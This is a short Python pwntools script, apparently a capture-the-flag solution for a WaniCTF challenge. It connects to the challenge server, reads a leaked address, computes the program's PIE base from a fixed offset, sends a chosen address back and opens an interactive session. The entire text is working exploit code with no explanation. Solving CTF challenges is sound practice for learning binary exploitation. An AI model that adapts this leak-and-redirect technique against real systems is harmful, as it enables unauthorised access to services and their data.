from pwn import *
r = remote("binsh.wanictf.org", 9003)
r.recvuntil("The address of \"input  \" is ")
leak = int(r.recv(14), 16)
pie_base = leak - 0x202010

r.sendline(hex(pie_base + 0x202020)[2:])
r.interactive()
